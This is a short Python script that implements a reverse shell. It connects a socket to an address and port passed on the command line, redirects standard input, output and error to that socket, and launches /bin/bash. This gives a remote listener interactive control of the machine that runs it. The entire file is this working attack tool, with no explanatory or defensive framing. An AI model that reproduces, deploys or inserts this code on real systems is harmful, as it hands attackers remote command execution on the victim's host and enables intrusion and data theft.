import subprocess
import os
import sys
import socket

def shell(addr, port):
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.connect((addr, int(port)))
	os.dup2(sock.fileno(), 0)
	os.dup2(sock.fileno(), 1)
	os.dup2(sock.fileno(), 2)
	subprocess.call(["/bin/bash"])
	sock.close()
	
def main():
	shell(sys.argv[1], sys.argv[2])	
	
if __name__ == '__main__':
	main()
